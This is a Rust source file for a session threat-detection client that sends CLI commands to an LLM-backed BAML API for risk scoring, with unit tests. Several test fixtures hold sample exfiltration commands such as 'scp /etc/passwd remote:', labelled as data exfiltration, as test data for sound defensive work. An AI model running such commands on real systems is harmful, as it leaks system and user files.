use crate::threat::{RiskSource, TagMatches, ThreatLevel, ThreatResult};
use crate::{Result, ThreatDetectionError};
use log::{debug, error, warn};
use serde::{Deserialize, Serialize};
use std::time::Duration;

/// Retry configuration for BAML API calls
const MAX_RETRIES: u32 = 3;
const INITIAL_DELAY_MS: u64 = 200;
const BACKOFF_MULTIPLIER: f64 = 1.5;
const MAX_DELAY_MS: u64 = 10_000;

/// BAML REST API client for threat detection
///
/// Calls BAML REST API endpoint to analyze commands/activity for threats.
/// Based on BAML documentation: https://docs.boundaryml.com/guide/installation-language/rest-api-other-languages
///
/// Uses BAML functions:
/// - AnalyzeCliText: Analyze CLI text with protocol context and command history
/// - ExtractCommandSummary: Generate session summaries
///
/// All API calls are retried with exponential backoff on transient failures.
pub struct BamlClient {
    endpoint: String,
    api_key: Option<String>,
    client: reqwest::Client,
}

/// BAML function request payload for AnalyzeCliText
#[derive(Debug, Serialize)]
struct AnalyzeCliTextRequest {
    cli_lines: Vec<String>,
    previous_protocol: String,
    previous_commands: Vec<String>,
}

/// BAML function request payload for ExtractCommandSummary
#[derive(Debug, Serialize)]
struct ExtractCommandSummaryRequest {
    command_sequence: Vec<String>,
}

/// BAML KeystrokeAnalysisResponse (matches BAML schema)
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct KeystrokeAnalysisResponse {
    pub analysis_report: Vec<Analysis>,
    pub overall_summary: String,
}

/// BAML Analysis (matches BAML schema)
///
/// Contains both categorical risk_level and optional numeric risk_score (1-20).
/// New optional fields (risk_score, action_effects, command_text, overall_summary)
/// use `#[serde(default)]` for backward compatibility with older BAML responses.
#[derive(Debug, Deserialize, Clone, Serialize)]
pub struct Analysis {
    /// Categorical risk level string ("Low", "Medium", "High", "Critical")
    pub risk_level: String,
    /// Numeric risk score (1-20) - primary scoring, optional for backward compat
    #[serde(default)]
    pub risk_score: Option<u8>,
    /// Risk category (e.g., "DestructiveActivity", "DataExfiltration")
    pub risk_category: String,
    /// Factual description of what the command does
    #[serde(default)]
    pub action_effects: Option<String>,
    /// The exact command text identified by the LLM
    #[serde(default)]
    pub command_text: Option<String>,
    /// One sentence explanation of risk assessment
    pub reasoning: String,
    /// Brief summary ("The user performed...")
    #[serde(default)]
    pub overall_summary: Option<String>,
}

/// BAML CommandSummaryResponse (matches BAML schema)
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct CommandSummaryResponse {
    pub overall_summary: String,
    /// Overall risk score for the session (highest seen)
    #[serde(default)]
    pub overall_risk_score: Option<u8>,
    /// Overall risk level for the session
    #[serde(default)]
    pub overall_risk_level: Option<String>,
}

impl BamlClient {
    /// Create a new BAML client
    ///
    /// # Arguments
    ///
    /// * `endpoint` - BAML REST API endpoint URL
    /// * `api_key` - Optional API key for authentication
    /// * `timeout` - Request timeout (default: 5 seconds)
    pub fn new(endpoint: String, api_key: Option<String>, timeout: Option<Duration>) -> Self {
        // reqwest::Client::builder().build() only fails if TLS backend
        // initialization fails, which is a system-level issue. Using expect()
        // here is acceptable -- there's no reasonable recovery path.
        let client = reqwest::Client::builder()
            .timeout(timeout.unwrap_or(Duration::from_secs(5)))
            .build()
            .expect("TLS backend initialization failed -- cannot create HTTP client");

        Self {
            endpoint,
            api_key,
            client,
        }
    }

    /// Retry a BAML request with exponential backoff.
    ///
    /// Matches the Python reference implementation's `_retry_baml_request()`.
    /// Retries up to MAX_RETRIES times with exponential backoff starting at
    /// INITIAL_DELAY_MS and capped at MAX_DELAY_MS.
    async fn retry_request<F, Fut, T>(&self, request_fn: F) -> Result<T>
    where
        F: Fn() -> Fut,
        Fut: std::future::Future<Output = Result<T>>,
    {
        let mut delay_ms = INITIAL_DELAY_MS;
        let mut last_error = None;

        for attempt in 0..=MAX_RETRIES {
            match request_fn().await {
                Ok(result) => return Ok(result),
                Err(e) => {
                    if attempt < MAX_RETRIES {
                        warn!(
                            "BAML request failed (attempt {}/{}): {}, retrying in {}ms",
                            attempt + 1,
                            MAX_RETRIES + 1,
                            e,
                            delay_ms
                        );
                        tokio::time::sleep(Duration::from_millis(delay_ms)).await;
                        delay_ms = ((delay_ms as f64) * BACKOFF_MULTIPLIER).min(MAX_DELAY_MS as f64)
                            as u64;
                    }
                    last_error = Some(e);
                }
            }
        }

        Err(last_error.expect("retry loop must execute at least once"))
    }

    /// Internal: single attempt at AnalyzeCliText
    async fn analyze_cli_text_once(
        &self,
        cli_lines: &[String],
        previous_protocol: &str,
        previous_commands: &[String],
    ) -> Result<KeystrokeAnalysisResponse> {
        let function_endpoint = format!("{}/AnalyzeCliText", self.endpoint.trim_end_matches('/'));

        let request = AnalyzeCliTextRequest {
            cli_lines: cli_lines.to_vec(),
            previous_protocol: previous_protocol.to_string(),
            previous_commands: previous_commands.to_vec(),
        };

        let mut req = self.client.post(&function_endpoint).json(&request);

        if let Some(ref key) = self.api_key {
            req = req.header("Authorization", format!("Bearer {}", key));
        }

        req = req.header("Content-Type", "application/json");

        let response = req.send().await.map_err(ThreatDetectionError::HttpError)?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response
                .text()
                .await
                .unwrap_or_else(|_| "Unknown error".to_string());
            error!("BAML AnalyzeCliText API error: {} - {}", status, error_text);
            return Err(ThreatDetectionError::BamlApiError(format!(
                "HTTP {}: {}",
                status, error_text
            )));
        }

        let baml_response: KeystrokeAnalysisResponse = response
            .json()
            .await
            .map_err(ThreatDetectionError::HttpError)?;

        Ok(baml_response)
    }

    /// Analyze CLI text with richer context using BAML AnalyzeCliText function
    ///
    /// This is the richer analysis endpoint that accepts protocol context and
    /// previous command history, matching the Python reference implementation.
    /// Retries with exponential backoff on transient failures.
    ///
    /// # Arguments
    ///
    /// * `cli_lines` - Lines of CLI text to analyze
    /// * `previous_protocol` - The protocol being used (e.g., "ssh", "rdp")
    /// * `previous_commands` - Previous commands for context
    ///
    /// # Returns
    ///
    /// KeystrokeAnalysisResponse with analysis_report and overall_summary
    pub async fn analyze_cli_text(
        &self,
        cli_lines: &[String],
        previous_protocol: &str,
        previous_commands: &[String],
    ) -> Result<KeystrokeAnalysisResponse> {
        debug!(
            "BAML: Analyzing CLI text ({} lines, protocol: {}, {} previous commands)",
            cli_lines.len(),
            previous_protocol,
            previous_commands.len()
        );

        let lines = cli_lines.to_vec();
        let protocol = previous_protocol.to_string();
        let prev_cmds = previous_commands.to_vec();
        let result = self
            .retry_request(|| {
                let lines_ref = lines.as_slice();
                let protocol_ref = protocol.as_str();
                let prev_cmds_ref = prev_cmds.as_slice();
                async move {
                    self.analyze_cli_text_once(lines_ref, protocol_ref, prev_cmds_ref)
                        .await
                }
            })
            .await?;

        debug!(
            "BAML: AnalyzeCliText complete - {} reports, summary: {}",
            result.analysis_report.len(),
            result.overall_summary
        );

        Ok(result)
    }

    /// Internal: single attempt at ExtractCommandSummary
    async fn extract_command_summary_once(
        &self,
        command_sequence: &[String],
    ) -> Result<CommandSummaryResponse> {
        let function_endpoint = format!(
            "{}/ExtractCommandSummary",
            self.endpoint.trim_end_matches('/')
        );

        let request = ExtractCommandSummaryRequest {
            command_sequence: command_sequence.to_vec(),
        };

        let mut req = self.client.post(&function_endpoint).json(&request);

        if let Some(ref key) = self.api_key {
            req = req.header("Authorization", format!("Bearer {}", key));
        }

        req = req.header("Content-Type", "application/json");

        let response = req.send().await.map_err(ThreatDetectionError::HttpError)?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response
                .text()
                .await
                .unwrap_or_else(|_| "Unknown error".to_string());
            error!("BAML API error: {} - {}", status, error_text);
            return Err(ThreatDetectionError::BamlApiError(format!(
                "HTTP {}: {}",
                status, error_text
            )));
        }

        let baml_response: CommandSummaryResponse = response
            .json()
            .await
            .map_err(ThreatDetectionError::HttpError)?;

        Ok(baml_response)
    }

    /// Generate command summary using BAML ExtractCommandSummary function
    ///
    /// Retries with exponential backoff on transient failures.
    ///
    /// # Arguments
    ///
    /// * `command_sequence` - List of commands in order
    ///
    /// # Returns
    ///
    /// CommandSummaryResponse with overall_summary and optional risk fields
    pub async fn extract_command_summary(
        &self,
        command_sequence: &[String],
    ) -> Result<CommandSummaryResponse> {
        debug!(
            "BAML: Generating summary for {} commands",
            command_sequence.len()
        );

        let cmds = command_sequence.to_vec();
        let result = self
            .retry_request(|| {
                let cmds_ref = cmds.as_slice();
                async move { self.extract_command_summary_once(cmds_ref).await }
            })
            .await?;

        debug!("BAML: Summary generated: {}", result.overall_summary);

        Ok(result)
    }

    /// Convert BAML Analysis to ThreatResult
    ///
    /// Maps categorical risk_level and optional numeric risk_score from BAML
    /// response into a ThreatResult. Uses numeric score from LLM if provided,
    /// otherwise derives from categorical level.
    pub fn analysis_to_threat_result(
        &self,
        analysis: &Analysis,
        overall_summary: &str,
    ) -> ThreatResult {
        let risk_level_lower = analysis.risk_level.to_lowercase();

        let level = match risk_level_lower.as_str() {
            "critical" => ThreatLevel::Critical,
            "high" => ThreatLevel::High,
            "medium" => ThreatLevel::Medium,
            "low" => ThreatLevel::Low,
            _ => ThreatLevel::None,
        };

        // Use numeric score from LLM if provided, otherwise derive from categorical level
        let risk_score = analysis.risk_score.unwrap_or_else(|| level.to_risk_score());

        ThreatResult {
            level,
            risk_score,
            risk_level_source: RiskSource::ModelDefault,
            confidence: 0.8,
            description: format!("{} - {}", analysis.risk_category, analysis.reasoning),
            action: if level == ThreatLevel::Critical || level == ThreatLevel::High {
                "terminate".to_string()
            } else {
                "monitor".to_string()
            },
            command_text: analysis.command_text.clone(),
            risk_category: Some(analysis.risk_category.clone()),
            tag_matches: TagMatches::default(),
            should_terminate_session: matches!(level, ThreatLevel::Critical | ThreatLevel::High),
            metadata: serde_json::json!({
                "risk_category": analysis.risk_category,
                "reasoning": analysis.reasoning,
                "overall_summary": overall_summary,
                "action_effects": analysis.action_effects,
            }),
        }
    }

    /// Health check - test BAML API connectivity
    pub async fn health_check(&self) -> Result<()> {
        let test_lines = vec!["ls".to_string()];
        match self.analyze_cli_text(&test_lines, "ssh", &[]).await {
            Ok(_) => Ok(()),
            Err(e) => {
                warn!("BAML health check failed: {}", e);
                Err(e)
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Helper to create an Analysis with all fields for testing
    fn make_analysis(risk_level: &str, risk_category: &str, reasoning: &str) -> Analysis {
        Analysis {
            risk_level: risk_level.to_string(),
            risk_score: None,
            risk_category: risk_category.to_string(),
            action_effects: None,
            command_text: None,
            reasoning: reasoning.to_string(),
            overall_summary: None,
        }
    }

    #[test]
    fn test_analysis_to_threat_result_critical() {
        let client = BamlClient::new("http://localhost:8000".to_string(), None, None);
        let analysis = make_analysis("Critical", "DestructiveActivity", "Command deletes files");

        let threat = client.analysis_to_threat_result(&analysis, "User deleted files");
        assert_eq!(threat.level, ThreatLevel::Critical);
        assert!(threat.should_terminate_session);
        assert_eq!(threat.action, "terminate");
        assert!(matches!(threat.risk_level_source, RiskSource::ModelDefault));
    }

    #[test]
    fn test_analysis_to_threat_result_low() {
        let client = BamlClient::new("http://localhost:8000".to_string(), None, None);
        let analysis = make_analysis("Low", "RoutineOperations", "Lists directory contents");

        let threat = client.analysis_to_threat_result(&analysis, "User listed files");
        assert_eq!(threat.level, ThreatLevel::Low);
        assert!(!threat.should_terminate_session);
        assert_eq!(threat.action, "monitor");
    }

    #[test]
    fn test_analysis_to_threat_result_with_risk_score() {
        let client = BamlClient::new("http://localhost:8000".to_string(), None, None);
        let analysis = Analysis {
            risk_level: "High".to_string(),
            risk_score: Some(16),
            risk_category: "DataExfiltration".to_string(),
            action_effects: Some("Copies sensitive data to external server".to_string()),
            command_text: Some("scp /etc/passwd remote:".to_string()),
            reasoning: "Exfiltrating sensitive system files".to_string(),
            overall_summary: Some("Data exfiltration attempt".to_string()),
        };

        let threat = client.analysis_to_threat_result(&analysis, "Data exfiltration detected");
        assert_eq!(threat.level, ThreatLevel::High);
        assert_eq!(threat.risk_score, 16);
        assert!(threat.should_terminate_session);
        assert_eq!(
            threat.command_text,
            Some("scp /etc/passwd remote:".to_string())
        );
        assert_eq!(threat.risk_category, Some("DataExfiltration".to_string()));
    }

    #[test]
    fn test_analysis_to_threat_result_unknown_level() {
        let client = BamlClient::new("http://localhost:8000".to_string(), None, None);
        let analysis = make_analysis("Unknown", "Other", "Unrecognized risk level");

        let threat = client.analysis_to_threat_result(&analysis, "Unknown activity");
        assert_eq!(threat.level, ThreatLevel::None);
        assert!(!threat.should_terminate_session);
        assert_eq!(threat.action, "monitor");
    }

    #[test]
    fn test_analysis_deserialization_with_all_fields() {
        let json = r#"{
            "risk_level": "High",
            "risk_score": 15,
            "risk_category": "DataExfiltration",
            "action_effects": "Copies files to remote server",
            "command_text": "scp data.db remote:",
            "reasoning": "Sensitive data transfer",
            "overall_summary": "User attempted data exfiltration"
        }"#;

        let analysis: Analysis = serde_json::from_str(json).unwrap();
        assert_eq!(analysis.risk_level, "High");
        assert_eq!(analysis.risk_score, Some(15));
        assert_eq!(analysis.risk_category, "DataExfiltration");
        assert_eq!(
            analysis.action_effects.as_deref(),
            Some("Copies files to remote server")
        );
        assert_eq!(
            analysis.command_text.as_deref(),
            Some("scp data.db remote:")
        );
        assert_eq!(analysis.reasoning, "Sensitive data transfer");
        assert_eq!(
            analysis.overall_summary.as_deref(),
            Some("User attempted data exfiltration")
        );
    }

    #[test]
    fn test_analysis_deserialization_backward_compat() {
        // Old BAML responses only have risk_level, risk_category, reasoning
        let json = r#"{
            "risk_level": "Low",
            "risk_category": "RoutineOperations",
            "reasoning": "Lists directory"
        }"#;

        let analysis: Analysis = serde_json::from_str(json).unwrap();
        assert_eq!(analysis.risk_level, "Low");
        assert_eq!(analysis.risk_score, None);
        assert_eq!(analysis.risk_category, "RoutineOperations");
        assert_eq!(analysis.action_effects, None);
        assert_eq!(analysis.command_text, None);
        assert_eq!(analysis.reasoning, "Lists directory");
        assert_eq!(analysis.overall_summary, None);
    }

    #[test]
    fn test_command_summary_response_deserialization() {
        let json = r#"{
            "overall_summary": "User performed routine operations",
            "overall_risk_score": 3,
            "overall_risk_level": "Low"
        }"#;

        let response: CommandSummaryResponse = serde_json::from_str(json).unwrap();
        assert_eq!(
            response.overall_summary,
            "User performed routine operations"
        );
        assert_eq!(response.overall_risk_score, Some(3));
        assert_eq!(response.overall_risk_level.as_deref(), Some("Low"));
    }

    #[test]
    fn test_command_summary_response_backward_compat() {
        let json = r#"{
            "overall_summary": "User performed routine operations"
        }"#;

        let response: CommandSummaryResponse = serde_json::from_str(json).unwrap();
        assert_eq!(
            response.overall_summary,
            "User performed routine operations"
        );
        assert_eq!(response.overall_risk_score, None);
        assert_eq!(response.overall_risk_level, None);
    }

    #[tokio::test]
    async fn test_retry_request_succeeds_first_try() {
        let client = BamlClient::new("http://localhost:8000".to_string(), None, None);
        let call_count = std::sync::atomic::AtomicU32::new(0);

        let result = client
            .retry_request(|| {
                call_count.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                async { Ok::<_, ThreatDetectionError>(42) }
            })
            .await;

        assert_eq!(result.unwrap(), 42);
        assert_eq!(call_count.load(std::sync::atomic::Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn test_retry_request_retries_on_failure() {
        let client = BamlClient::new("http://localhost:8000".to_string(), None, None);
        let call_count = std::sync::atomic::AtomicU32::new(0);

        let result = client
            .retry_request(|| {
                let attempt = call_count.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                async move {
                    if attempt < 2 {
                        Err(ThreatDetectionError::BamlApiError(
                            "transient failure".to_string(),
                        ))
                    } else {
                        Ok::<_, ThreatDetectionError>(99)
                    }
                }
            })
            .await;

        assert_eq!(result.unwrap(), 99);
        // Should have been called 3 times: 2 failures + 1 success
        assert_eq!(call_count.load(std::sync::atomic::Ordering::SeqCst), 3);
    }

    #[tokio::test]
    async fn test_retry_request_exhausts_retries() {
        let client = BamlClient::new("http://localhost:8000".to_string(), None, None);
        let call_count = std::sync::atomic::AtomicU32::new(0);

        let result: Result<i32> = client
            .retry_request(|| {
                call_count.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                async {
                    Err(ThreatDetectionError::BamlApiError(
                        "persistent failure".to_string(),
                    ))
                }
            })
            .await;

        assert!(result.is_err());
        // MAX_RETRIES + 1 = 4 attempts total
        assert_eq!(
            call_count.load(std::sync::atomic::Ordering::SeqCst),
            MAX_RETRIES + 1
        );
    }

    #[test]
    fn test_analysis_serialization_roundtrip() {
        let analysis = Analysis {
            risk_level: "High".to_string(),
            risk_score: Some(15),
            risk_category: "DataExfiltration".to_string(),
            action_effects: Some("Copies files".to_string()),
            command_text: Some("scp data remote:".to_string()),
            reasoning: "Sensitive transfer".to_string(),
            overall_summary: Some("Exfiltration attempt".to_string()),
        };

        let json = serde_json::to_string(&analysis).unwrap();
        let deserialized: Analysis = serde_json::from_str(&json).unwrap();

        assert_eq!(deserialized.risk_level, analysis.risk_level);
        assert_eq!(deserialized.risk_score, analysis.risk_score);
        assert_eq!(deserialized.risk_category, analysis.risk_category);
        assert_eq!(deserialized.action_effects, analysis.action_effects);
        assert_eq!(deserialized.command_text, analysis.command_text);
        assert_eq!(deserialized.reasoning, analysis.reasoning);
        assert_eq!(deserialized.overall_summary, analysis.overall_summary);
    }
}
